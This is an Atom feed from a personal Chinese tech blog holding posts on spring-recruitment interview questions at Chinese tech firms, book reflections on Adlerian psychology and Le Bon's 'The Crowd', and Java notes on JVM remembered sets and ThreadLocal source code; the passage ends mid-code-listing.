<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>FreeThinking&#39;s Blog</title>
  
  
  <link href="http://lishuaiyun.cn/atom.xml" rel="self"/>
  
  <link href="http://lishuaiyun.cn/"/>
  <updated>2022-05-02T12:44:14.220Z</updated>
  <id>http://lishuaiyun.cn/</id>
  
  <author>
    <name>醉心</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>春招全记录</title>
    <link href="http://lishuaiyun.cn/2022/05/02/%E6%98%A5%E6%8B%9B%E5%85%A8%E8%AE%B0%E5%BD%95/"/>
    <id>http://lishuaiyun.cn/2022/05/02/%E6%98%A5%E6%8B%9B%E5%85%A8%E8%AE%B0%E5%BD%95/</id>
    <published>2022-05-02T12:18:11.000Z</published>
    <updated>2022-05-02T12:44:14.220Z</updated>
    
    <content type="html"><![CDATA[<p>春招结束大概有半个月了，今晚闲来无事想总结下自己的春招。</p><p>大概投递了以下公司：</p><p>美团，拼多多，360，蚂蚁，米哈游，网易，华为，百度，腾讯，字节，快手</p><p>进入面试的有：</p><p>美团，蚂蚁，网易，华为，腾讯，字节，快手</p><p>收到意向：蚂蚁，字节，快手</p><p>还在排序：网易，华为</p><p>面了一半放弃：腾讯</p><p>面的基本都过了，不会很高级的知识，感觉关键在于算法题做出来和简历上写的都很有把握，基本面试官问的我简历上的东西我都能比较熟练的回答出来，而且大厂更看基础，几乎所有的面试官给我的评价都是基础很好。</p><p>我是很反感面向面试学习，我基本没有看过面经，针对面经的问题复习不够体系化，深度也不够，关键还是把学过的知识形成体系，深度足够。</p><h1 id="1-美团"><a href="#1-美团" class="headerlink" title="1. 美团"></a>1. 美团</h1><p>美团笔试直接白卷G了，但后来还是被捞了，一面过，二面挂。</p><p><strong>一面</strong></p><ol><li>mysql和redis区别，各自的应用场景。</li><li>你刚才说的都是mysql和redis的写，举个读的应用场景。</li><li>mysql和redis怎么同步，redis读mysql的时候读主库还是从库，读主库主库负载不了，读从库延迟怎么办</li><li>多个从库延迟不同，读取结果不同怎么办</li><li>如果用主主架构行吗</li><li>rpc框架用过吗</li><li>rpc有同步调用和异步调用，区别是什么</li><li>同步阻塞和同步非阻塞的区别是什么，各自优缺点</li><li>注册中心用过吗</li><li>eureka原理是什么，怎么做到注册的</li><li>请求长时间得不到响应怎么办</li><li>长连接和短连接的优缺点</li><li>进程和线程区别，各自的通信机制</li><li>切换的时候各自的代价</li><li>实习的时候用过spark，spark怎么获知不同机器之间的信息</li><li>算法：反转指定区间内的链表</li></ol><p>一面全问了框架，这块只是了解，全程靠猜。</p><p><strong>二面</strong></p><ol><li>RPC框架</li><li>MySQL事务</li><li>事务拆分</li><li>秒杀数据库一致性</li><li>实习项目框架</li><li>设计模式随便说一个</li></ol><h1 id="2-蚂蚁"><a href="#2-蚂蚁" class="headerlink" title="2. 蚂蚁"></a>2. 蚂蚁</h1><p>阿里系八股问的不多，算法也不怎么做，主要就是项目，考察知识的灵活运用。</p><p><strong>一面</strong></p><ol><li>泛型用在什么场景？</li><li>接口上使用泛型实现类需要实现该泛型吗？</li><li>反射能不能拿到父类和父类中的private</li><li>抽象类和接口应用场景</li><li>查看timewait的linux命令</li><li>error能被捕捉吗 受检异常和非受检异常</li><li>秒杀系统怎么防止超卖（MySQL stock &gt; 0）</li><li>mysql扛不住怎么办？</li><li>内存标记为0如果有人回表怎么办？从技术上和业务两个角度解决问题</li><li>如果并发量太大，每条记录要做日志怎么处理</li><li>不用消息队列怎么办</li><li>重复秒杀</li><li>限流</li><li>kafka了解吗说一说</li><li>redis读多写少的话怎么分片</li></ol><p><strong>二面</strong></p><ol><li>实习相关</li><li>秒杀相关</li><li>redis集群重新分片</li></ol><p><strong>三面</strong></p><ol><li>为什么做秒杀</li><li>整体的架构思路和优化思路</li><li>超卖几种情况，怎么解决</li><li>少卖几种情况，怎么解决</li><li>介绍实习工作</li><li>怎么优化的？整体思路</li><li>遇到的最大挑战</li><li>怎么学习的</li><li>为什么不待在之前实习的公司</li><li>职业规划</li></ol><h1 id="3-网易雷火"><a href="#3-网易雷火" class="headerlink" title="3. 网易雷火"></a>3. 网易雷火</h1><p>一二面表现不错，三面感觉差点意思，主要是策略模式应该用了动态绑定实现，这个当时没想起来怎么做</p><p><strong>一面</strong></p><ol><li>数据库存的数据乱码怎么办？</li><li>数据库本身编码不对？不是这个原因</li><li>sql调优</li><li>docker file用过吗</li><li>docker image发布过吗</li><li>linux查看进程</li><li>sql  语句 查不重复的值</li><li>redis过期键删除策略</li><li>定期删除的具体选取键是怎么选的</li><li>spring ioc</li><li>结束进程的方式</li></ol><p><strong>二面</strong></p><ol><li>HashTable和ConcurrentHashMap</li><li>redis用c写的，怎么优化让它变快的</li><li>redis持久化</li><li>mysql持久化</li><li>spring aop</li><li>springboot启动流程</li><li>算法：剪绳子</li></ol><p><strong>三面</strong></p><ol><li>手写策略模式</li><li><p>策略模式优缺点</p></li><li><p>手画Java线程状态变化图</p></li><li><p>线程池创建以及所有参数</p></li><li><p>自己实现线程同步</p></li><li><p>使用定义泛型使用一下</p></li></ol><h1 id="4-华为"><a href="#4-华为" class="headerlink" title="4. 华为"></a>4. 华为</h1><p><strong>一面</strong></p><ol><li>实习</li><li>timewait</li><li>用过什么设计模式</li><li>找到带有某个字符的文件</li><li>linux命令</li><li>常用数据结构</li><li>linux 文件系统</li><li>算法：砖墙</li></ol><p><strong>二面</strong></p><p>主管学数学的，看我本科学数学，撞枪口了属于是</p><ol><li>实数怎么定义，数学符号语言描述</li><li>啥最难，我说实变函数，他就问实变函数，G</li><li>测度的定义</li><li>还有实变函数的一些问题，全不会</li><li>开放性问题</li></ol><h1 id="5-腾讯"><a href="#5-腾讯" class="headerlink" title="5. 腾讯"></a>5. 腾讯</h1><p><strong>一面</strong></p><ol><li>实习</li><li>秒杀项目</li><li>算法1：寻找二维有序数组的第k大的数</li><li>算法2：判断合法括号</li></ol><p><strong>二面</strong></p><p>后期没有面试状态了，加上部门业务不感兴趣，不想面了二面就拒绝了</p><h1 id="6-字节"><a href="#6-字节" class="headerlink" title="6. 字节"></a>6. 字节</h1><p><strong>一面</strong></p><ol><li>三次握手和四次挥手</li><li>线程池</li><li>拒绝策略</li><li>阻塞队列</li><li>JVM运行时数据区</li><li>算法：编辑距离</li></ol><p><strong>二面</strong></p><ol><li>实习</li><li>进程通信的方式</li><li>共享内存会出现什么问题</li><li>java锁升级</li><li>threadlocal</li><li>最长不重复子字符串</li><li>交替打印</li></ol><p><strong>三面</strong></p><ol><li>user<id, name ,parentId> 建树（为一个数据库表转化成树结构然后遍历树结构输出）</li><li>建好的树层序遍历</li></ol><h1 id="7-快手"><a href="#7-快手" class="headerlink" title="7. 快手"></a>7. 快手</h1><p><strong>一面</strong></p><ol><li>用过快手吗？快手应该从哪改进</li><li>发出http报文后到渲染到浏览器过程</li><li>Java内存结构</li><li>CMS垃圾收集器</li><li>HashMap</li><li>B+树</li><li>synchronized</li><li>volatile</li><li>希尔排序</li><li>堆排序</li><li>数据链路层的设备：交换机</li><li>redis用过什么数据结构</li><li>算法：第k大的数字（快排）</li></ol><p>这是八股强度最大的一次，问了也不深入，麻木的问答，感觉是kpi</p><p><strong>二面</strong></p><ol><li>实习</li><li>秒杀</li><li>B+树结构</li><li>算法：合并k个有序链表</li></ol><p>二面完主管当场夸了说很好，后面让hr安排入职，问了下我能实习多长实现，回答三个月而且还不能立即到岗，当场G。</p>]]></content>
    
    
    <summary type="html">春招面试情况汇总</summary>
    
    
    
    <category term="工作" scheme="http://lishuaiyun.cn/categories/%E5%B7%A5%E4%BD%9C/"/>
    
    
    <category term="春招" scheme="http://lishuaiyun.cn/tags/%E6%98%A5%E6%8B%9B/"/>
    
  </entry>
  
  <entry>
    <title>被讨厌的勇气</title>
    <link href="http://lishuaiyun.cn/2022/05/02/%E8%A2%AB%E8%AE%A8%E5%8E%8C%E7%9A%84%E5%8B%87%E6%B0%94/"/>
    <id>http://lishuaiyun.cn/2022/05/02/%E8%A2%AB%E8%AE%A8%E5%8E%8C%E7%9A%84%E5%8B%87%E6%B0%94/</id>
    <published>2022-05-02T12:16:57.000Z</published>
    <updated>2022-05-02T13:23:13.589Z</updated>
    
    <content type="html"><![CDATA[<p>心理学有群体心理学和个体心理学。之前的《乌合之众》讲的是个体在群体中的表现，群体在社会中的的心理特征，而被讨厌的勇气就是个体心理学，讲的是单独的个体，其内在的心里表现。</p><p>个体心理学有三大巨头：弗洛伊德，荣格和阿德勒。被讨厌的勇气讲的是阿德勒心理哲学。</p><h1 id="1-第一夜"><a href="#1-第一夜" class="headerlink" title="1. 第一夜"></a>1. 第一夜</h1><p>当下的一切都由过去推导而来，要想解决心理创伤，首先要知道过去发生了什么事导致了现在的心理创伤，进而去解决它，这是弗洛伊德主张的原因论。</p><p>阿德勒心理学否定原因论，主张目的论，遭遇了重大的挫折并不是不会对我们的人格产生影响，相反，影响会很大。但过去发生了什么并不重要，重要的是我们对过去的经历赋予了什么意义，并不是过去发生了什么一定早就了现在的我们，我们的生活由我们自己决定，是我们对于过去经历的解读形成了现在的我们，这颠覆了传统心理学因果论的思想。之前看过刘慈欣的短篇小说《镜子》，超弦计算机，创世程序，只要模拟的宇宙爆炸和我们本身所在宇宙大爆炸参数一致，后面的一切都可以由计算机推导出来，emmm，认同阿德勒的心理学吧，但是站到大刘小说最宏观的宇宙下，我还真觉得都能由计算机推导…</p><p>这样的思想是在无视现实世界既定的事实吗？物质世界一切都是客观存在的，高房价，严重的社会阶级矛盾，舆论的控制都是现实，不关注过去发生了什么不是在无视现实吗？但是我们都是庞大的社会中的渺小个体，即便执着于过去我们也无法改变，所以执着于过去反而不太现实，改变不了世界，我们只能改变当下的自己，一个人的本性不能被更换，但能被更新，我们无法选择既定的过去，我们亦不能选择确定的未来，我们能做的，是活在当下的选择，我们之所以没有改变生活的决心，是因为我们在自己不断下着不要改变的决心：</p><ul><li>如果一直保持现在的我，如何应对眼前的事情都可以根据既有的经验推测，这是轻车熟路的状态。</li><li>如果选择新的生活方式，那就既不知道新的自己会遇到什么问题也不知道该怎么应对新的事情，未来的生活可能更好也可能更坏。</li></ul><p>人们即使心怀不满，但还是认为保持现状更加轻松和安心。人可以被改变，缺乏的只是选择自己新的生活方式的勇气。决定自己人生的是活在“此时此刻”的你自己。</p><h1 id="2-第二夜"><a href="#2-第二夜" class="headerlink" title="2. 第二夜"></a>2. 第二夜</h1>]]></content>
    
    
    <summary type="html">一个人不活在过去，不活在未来，只活在当下。</summary>
    
    
    
    <category term="读书分享" scheme="http://lishuaiyun.cn/categories/%E8%AF%BB%E4%B9%A6%E5%88%86%E4%BA%AB/"/>
    
    
    <category term="心理学" scheme="http://lishuaiyun.cn/tags/%E5%BF%83%E7%90%86%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>乌合之众</title>
    <link href="http://lishuaiyun.cn/2022/04/13/%E4%B9%8C%E5%90%88%E4%B9%8B%E4%BC%97/"/>
    <id>http://lishuaiyun.cn/2022/04/13/%E4%B9%8C%E5%90%88%E4%B9%8B%E4%BC%97/</id>
    <published>2022-04-13T13:34:14.000Z</published>
    <updated>2022-04-13T14:07:04.106Z</updated>
    
    <content type="html"><![CDATA[<p>《乌合之众》原名《The Crowd》,很明显译者翻译为《乌合之众》纯粹是为了标题党好卖，我很讨厌《乌合之众》这个书名，带有高高在上和不屑的意味，也有很多人自以为读了这本书就脱离了群体，认为自己是社会的精英，这显然就是低智行为了，没有人能脱离群体存在。</p><p>但这本书仍然贡献了很有用的观点，并且我们能跟当前的生活对应，《乌合之众》最核心的观点就是群体的智商低下，聪明的个体在融入群体之后会做出违背自身意志的行为，因为群体之间的意志具有简单性，传播性，迷惑性的特点。</p><p>这也是我对《乌合之众》翻译名很抗拒的原因，群体之间容易接收观点未必是一件坏事。好的方面，群体的信仰就是这样形成的，没有这些，我们无法形成瑰丽的文明。坏的方面，群体确实容易被煽动，比如微博评论经常表现为低智化。勒庞总体上对于群体观念是贬低态度，但仍不吝惜高度的赞扬：</p><p>他们当然是在无意识地实践着这些美德，然而这无碍大局， 我们不该对群体求全责备，说他们经常受无意识因素的左右，不善于动脑筋。在某些情况下，如果他们开动脑筋考虑起自己的眼前利益，我们这个星球上根本就不会成长出文明，人类也不会有自己的历史了。</p><p>让人们怀抱着那些希望和幻想吧，不然他们是活不下去的。这就是存在着诸神、英雄和诗人的原因。在渴望理想的心灵里，科学是有所欠缺的，因为它不敢做出过于慷慨的承诺，因为它不能撒谎。</p><p>群体从来不受理性的指引，是否该对此表示遗憾？我们不必贸然称是。毫无疑问，是幻觉引起的激情和愚顽，激励着人类走上了文明之路。 因此，还是让我们把理性留给哲人，不要过于强烈地坚持让它插手对人的统治吧。一切文明的主要动力并不是理性，倒不如说，尽管存在着理性，文明的动力仍然是各种感情，譬如尊严、自我牺牲、宗教信仰、爱国主义以及对荣誉的爱。</p><p>总结：勒庞有种族主义，贬低妇女，对群体贬低，书中的很多内容我们都不必在意，我们只需要记住，我们是群体的一部分，每个人既是独立的个体，又属于群体的一部分，不要觉得自己高高在上，然而对于群体之间的一些舆论，保持自己清醒的头脑，正如《黑客与画家》中说的那样，凡是不认同社会之处，你连想都不敢想，马上就放弃自己的观点，那才会真正出问题。</p>]]></content>
    
    
    <summary type="html">具有时代局限性仍可称为好书</summary>
    
    
    
    <category term="读书分享" scheme="http://lishuaiyun.cn/categories/%E8%AF%BB%E4%B9%A6%E5%88%86%E4%BA%AB/"/>
    
    
    <category term="心理学" scheme="http://lishuaiyun.cn/tags/%E5%BF%83%E7%90%86%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>JVM中的记忆集</title>
    <link href="http://lishuaiyun.cn/2022/03/02/JVM%E4%B8%AD%E7%9A%84%E8%AE%B0%E5%BF%86%E9%9B%86/"/>
    <id>http://lishuaiyun.cn/2022/03/02/JVM%E4%B8%AD%E7%9A%84%E8%AE%B0%E5%BF%86%E9%9B%86/</id>
    <published>2022-03-02T03:39:33.000Z</published>
    <updated>2022-03-26T13:13:22.132Z</updated>
    
    <content type="html"><![CDATA[<p>在JVM中的跨代引用这里一直有些疑惑，Minor GC时应该是从GC Roots为起点遍历整个分析链，这样的话要记忆集干嘛呢，因为记忆集是防止遍历老年代的呀。那如果GC Roots只遍历年轻代为止，JVM怎么知道遍历到的节点是年轻代还是老年代呢。</p><p>查了一些资料其实还挺深入的。</p><p><strong>新生代GC的时候从GC Roots出发不会扫描整个图，而是遍历到老年代对象就会停止（防止遍历整个老年代，节省开销）</strong>。因为HotSpot虚拟机在堆中地址空间连续，有一个分界线，一边是新生代，一边是老年代，如果遍历到老年代停止那老年代引用的新生代对象无法被遍历到，此时我们需要记忆集来维护一个列表记录哪些新生代被老年代引用，将这些老年代也加入GC Roots（因为是Minor GC，默认老年代都存活）。（记忆集的一种实现叫做卡表）</p><p>GC Roots是一组活跃的引用，通常是：</p><ul><li>Java 虚拟机栈（栈帧中的本地变量表）中引用的对象</li><li><p>本地方法栈中引用的对象</p></li><li><p>方法区中常量引用的对象</p></li><li><p>方法区中类静态属性引用的对象</p></li><li><p>所有被同步锁（synchronized关键字）持有的对象。 </p></li></ul><p>但也不只是这些，在Minor GC时不知道老年代的存活情况，默认老年代是存活的，<strong>所以要把引用新生代的老年代也都加入到GC Roots中。</strong></p><p>参考链接：</p><ul><li><a href="https://www.zhihu.com/question/53613423/answer/135743258">RednaxelaFX</a></li><li><a href="http://javainterview.gitee.io/luffy/2021/08/19/04-Java%E8%99%9A%E6%8B%9F%E6%9C%BA/04.%20%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/">Java3y</a></li></ul>]]></content>
    
    
    <summary type="html">JVM中的记忆集作用</summary>
    
    
    
    <category term="Java" scheme="http://lishuaiyun.cn/categories/Java/"/>
    
    
    <category term="JVM" scheme="http://lishuaiyun.cn/tags/JVM/"/>
    
  </entry>
  
  <entry>
    <title>threadlocal源码分析</title>
    <link href="http://lishuaiyun.cn/2022/02/21/threadlocal/"/>
    <id>http://lishuaiyun.cn/2022/02/21/threadlocal/</id>
    <published>2022-02-21T09:06:45.000Z</published>
    <updated>2022-03-26T13:14:38.517Z</updated>
    
    <content type="html"><![CDATA[<p>最近在看多线程相关的知识，关于ThreadLocal内存泄漏问题查了一些博客感觉都没有说明白，通过查看源码有了一些心得，这里分享一下。<strong>采用自顶向下的方式说明原理。</strong></p><h1 id="1-ThreadLocal作用"><a href="#1-ThreadLocal作用" class="headerlink" title="1. ThreadLocal作用"></a>1. ThreadLocal作用</h1><p>ThreadLocal是 JDK包提供的，它提供了线程本地变量，也就是如果你创建了一个ThreadLocal变量，那么访问这个变量的每个线程都会有这个变量的一个本地副本。当多个线程操作这个变量时，实际操作的是自己本地内存里面的变量，从而避免了线程安全问题。创建一个ThreadLocal变量后，每个线程都会复制一个变量到自己的本地内存，常用于保存userinfo，这样就不用将userinfo作为函数参数传递了。</p><h1 id="2-ThreadLocal原理探究"><a href="#2-ThreadLocal原理探究" class="headerlink" title="2. ThreadLocal原理探究"></a>2. ThreadLocal原理探究</h1><p>Thread类中有一个ThreadLocalMap类型的变量threadLocals，而ThreadLocalMap是一个哈希表。在默认情况下，每个线程中的这两个变量都为null，只有当前线程第一次调用ThreadLocal 的set或者get方法时才会创建它们。<strong>其实每个线程的本地变量不是存放在ThreadLocal实例里面，而是存放在调用线程的threadLocals变量里面。也就是说，ThreadLocal类型的本地变量存放在具体的线程内存空间中。ThreadLocal就是一个工具壳，它通过set方法把 value值放入调用线程threadLocals里面并存放起来，当调用线程调用它的get方法时，再从当前线程的threadLocals变量里面将其拿出来使用。</strong>另外，Thread里面的threadLocals被设计为map结构是因为每个线程可以关联多个ThreadLocal变量。</p><p>thread类中的threadlocals变量：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ThreadLocal values pertaining to this thread. This map is maintained</span></span><br><span class="line"><span class="comment"> * by the ThreadLocal class. */</span></span><br><span class="line">ThreadLocal.ThreadLocalMap threadLocals = <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure><p>threadlocal的set，get方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Returns the value in the current thread&#x27;s copy of this</span></span><br><span class="line"><span class="comment"> * thread-local variable.  If the variable has no value for the</span></span><br><span class="line"><span class="comment"> * current thread, it is first initialized to the value returned</span></span><br><span class="line"><span class="comment"> * by an invocation of the &#123;<span class="doctag">@link</span> #initialValue&#125; method.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the current thread&#x27;s value of this thread-local</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> T <span class="title">get</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//获取当前线程</span></span><br><span class="line">    Thread t = Thread.currentThread();</span><br><span class="line">    <span class="comment">//获取当前线程内的map并取值</span></span><br><span class="line">    ThreadLocalMap map = getMap(t);</span><br><span class="line">    <span class="keyword">if</span> (map != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ThreadLocalMap.Entry e = map.getEntry(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">if</span> (e != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            T result = (T)e.value;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> setInitialValue();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Variant of set() to establish initialValue. Used instead</span></span><br><span class="line"><span class="comment"> * of set() in case user has overridden the set() method.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the initial value</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(T value)</span> </span>&#123;</span><br><span class="line">    Thread t = Thread.currentThread();</span><br><span class="line">    ThreadLocalMap map = getMap(t);</span><br><span class="line">    <span class="keyword">if</span> (map != <span class="keyword">null</span>)</span><br><span class="line">        map.set(<span class="keyword">this</span>, value);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        createMap(t, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="3-ThreadLocal内存泄漏问题"><a href="#3-ThreadLocal内存泄漏问题" class="headerlink" title="3. ThreadLocal内存泄漏问题"></a>3. ThreadLocal内存泄漏问题</h1><p>ThreadLocal存在内存泄漏的隐患，因为根据原理知道变量是通过thread类中的threadlocals变量存储的，正常情况下threadlocals生命周期跟随Thread，当线程结束时，内部的threadlocals变量仍然通过threadlocal引用key。造成了内存泄漏的情况。那JDK对这种情况是否有相应的措施呢？其实是有的，看下源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadLocalMap</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Entry</span> <span class="keyword">extends</span> <span class="title">WeakReference</span>&lt;<span class="title">ThreadLocal</span>&lt;?&gt;&gt; </span>&#123;</span><br><span class="line">        <span class="comment">/** The value associated with this ThreadLocal. */</span></span><br><span class="line">        Object value;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//entry内部key是threadlocal对象，value存储set传递的值</span></span><br><span class="line">        Entry(ThreadLocal&lt;?&gt; k, Object v) &#123;</span><br><span class="line">            <span class="keyword">super</span>(k);</span><br><span class="line">            value = v;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">private</span> Entry[] table;</span><br><span class="line">    </span><br><span class="line">    ThreadLocalMap(ThreadLocal&lt;?&gt; firstKey, Object firstValue) &#123;</span><br><span class="line">        table = <span class="keyword">new</span> Entry[INITIAL_CAPACITY];<span class="comment">//强引用</span></span><br><span class="line">        <span class="keyword">int</span> i = firstKey.threadLocalHashCode &amp; (INITIAL_CAPACITY - <span class="number">1</span>);</span><br><span class="line">        table[i] = <span class="keyword">new</span> Entry(firstKey, firstValue);</span><br><span class="line">        size = <span class="number">1</span>;</span><br><span class="line">        setThreshold(INITIAL_CAPACITY);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Thread类中的Threadlocals对象是ThreadLocalMap实现的，ThreadLocalMap底层是Entry数组，单个Entry节点内部存放了key（threadlocal对象），value（实际要存放的数据），Entry节点继承了弱引用，<strong>存放key的时候将key设为弱引用</strong>。threadLocalMap引用entry是<strong>强引用</strong>。</p><p><img src="/img/threadlocal.jpg" alt="threadlocal.jpg"></p><p>若当前没有线程引用Entry节点时，我们知道弱引用对象会在下一次垃圾回收的时候被回收掉，于是垃圾回收后map内存放的对象变为<null, value>，那value还是强引用，节点还是不为空，仍在存活，其实在调用threadlocal的set，get，remove方法时都会寻找时机清理这些Entry节点为<null,value>的元素。以set方法为例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadLocal</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(T value)</span> </span>&#123;</span><br><span class="line">        Thread t = Thread.currentThread();</span><br><span class="line">        ThreadLocalMap map = getMap(t);</span><br><span class="line">        <span class="keyword">if</span> (map != <span class="keyword">null</span>)</span><br><span class="line">            map.set(<span class="keyword">this</span>, value);<span class="comment">//调用map的set方法内部会调用清理函数</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            createMap(t, value);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadLocalMap</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(ThreadLocal&lt;?&gt; key, Object value)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// We don&#x27;t use a fast path as with get() because it is at</span></span><br><span class="line">        <span class="comment">// least as common to use set() to create new entries as</span></span><br><span class="line">        <span class="comment">// it is to replace existing ones, in which case, a fast</span></span><br><span class="line">        <span class="comment">// path would fail more often than not.</span></span><br><span class="line"></span><br><span class="line">        Entry[] tab = table;</span><br><span class="line">        <span class="keyword">int</span> len = tab.length;</span><br><span class="line">        <span class="keyword">int</span> i = key.threadLocalHashCode &amp; (len-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Entry e = tab[i];</span><br><span class="line">             e != <span class="keyword">null</span>;</span><br><span class="line">             e = tab[i = nextIndex(i, len)]) &#123;</span><br><span class="line">            ThreadLocal&lt;?&gt; k = e.get();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (k == key) &#123;</span><br><span class="line">                e.value = value;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (k == <span class="keyword">null</span>) &#123;</span><br><span class="line">                 <span class="comment">//如果key为null，代表这个条目是陈旧的需要被回收的，可以直接用新值替代，内部结束的时候也会调用清理函数   </span></span><br><span class="line">                <span class="comment">//cleanSomeSlots()</span></span><br><span class="line">                replaceStaleEntry(key, value, i);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        tab[i] = <span class="keyword">new</span> Entry(key, value);</span><br><span class="line">        <span class="keyword">int</span> sz = ++size;</span><br><span class="line">        <span class="comment">//尝试清理如果返回false并且已经达到阈值，扩容</span></span><br><span class="line">        <span class="keyword">if</span> (!cleanSomeSlots(i, sz) &amp;&amp; sz &gt;= threshold)</span><br><span class="line">            rehash();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span 